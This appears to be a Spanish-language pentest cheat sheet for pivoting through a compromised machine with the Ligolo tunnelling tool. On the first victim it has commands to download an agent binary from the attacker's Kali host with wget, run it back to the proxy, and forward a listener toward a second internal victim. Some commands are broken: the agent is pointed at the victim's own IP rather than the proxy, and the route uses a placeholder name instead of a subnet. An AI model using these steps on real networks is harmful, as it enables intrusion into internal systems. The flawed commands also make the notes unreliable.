# LIGOLO


- tar -xf 



sudo ip tuntap add user $USER mode tun ligolo

sudo ip link set ligolo up


**red_pivoting -> 192.168.1.0/24**

sudo ip route add red_pivoting dev ligolo



## KALI LINUX    ip -> 10.0.2.100

chmod +x proxy

./proxy -selfcert

puerto -> 11601




## Maquina Pivoting  (Victima 1)    ip -> 10.0.2.101         ip2 -> 192.168.1.101



wget http://10.0.2.100/agente

chmod +x agente

./agente -connect 10.0.2.101:11601  -ignore-cert


 ### Maquina Kali

    - session 

    - Enter

    - start

    - ping -c 1  192.168.1.102

    - listener_add --addr 0.0.0.0:4443 --to  127.0.0.1:4443

    - listener_list

## Maquina Victima 2    ip -> 192.168.1.102



## Limpieza
 sudo ip route del red_pivoting dev ligolo

 sudo ip link del ligolo